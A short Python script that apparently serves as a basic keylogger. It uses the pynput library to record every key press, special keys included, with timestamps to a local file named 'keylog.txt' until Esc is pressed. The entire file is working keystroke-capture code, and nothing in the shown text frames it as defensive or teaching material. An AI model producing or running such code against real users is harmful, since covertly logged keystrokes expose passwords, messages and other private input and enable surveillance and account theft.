from pynput import keyboard
import logging
import os


log_file = "keylog.txt" # Name of file to store the log keystroke

#set up logging configuration
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG, #set logging level to debug
    format='%(asctime)s: %(message)s' # Format for log messages
)

def on_press(key):
    try:
        logging.info(f'key pressed: {key.char}') #log the character of the pressed key
    except AttributeError:
        logging.info(f'Special key pressed: {key}') # Log special keys (e.g ctrl, shift)

def on_release(key):
    if key == keyboard.Key.esc: #stop the listener when Esc key is released
        return False
    
# Create a listener to monitor keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Keep the listener running
